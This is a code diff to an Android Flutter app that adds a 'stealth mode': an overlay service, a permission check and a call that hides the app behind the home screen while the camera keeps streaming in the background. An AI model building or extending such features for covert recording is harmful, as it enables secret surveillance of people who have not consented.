@@ -86,8 +86,47 @@ class MainActivity : FlutterActivity() {
                     CameraStreamingService.stop(this)
                     result.success(true)
                 }
+                "startStealthOverlay" -> {
+                    ensureOverlayPermission()
+                    StealthOverlayService.start(this)
+                    result.success(true)
+                }
+                "stopStealthOverlay" -> {
+                    StealthOverlayService.stop(this)
+                    result.success(true)
+                }
+                "hasOverlayPermission" -> {
+                    val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        android.provider.Settings.canDrawOverlays(this)
+                    } else true
+                    result.success(granted)
+                }
+                "minimizeApp" -> {
+                    // ย่อ activity ไป background (เห็น home screen แทน)
+                    // ใช้สำหรับ stealth mode — กล้องยังสตรีมต่อใน background
+                    moveTaskToBack(true)
+                    result.success(true)
+                }
                 else -> result.notImplemented()
             }
+        }
+    }
+
+    /**
+     * ขอ SYSTEM_ALERT_WINDOW permission — user ต้อง grant manual ผ่าน Settings
+     * ถ้ายังไม่ได้รับ → เปิด Settings page อัตโนมัติ
+     */
+    private fun ensureOverlayPermission() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
+        if (android.provider.Settings.canDrawOverlays(this)) return
+        try {
+            val intent = Intent(
+                android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:$packageName"),
+            )
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.w(TAG, "Cannot open overlay settings: ${e.message}")
         }
     }
 
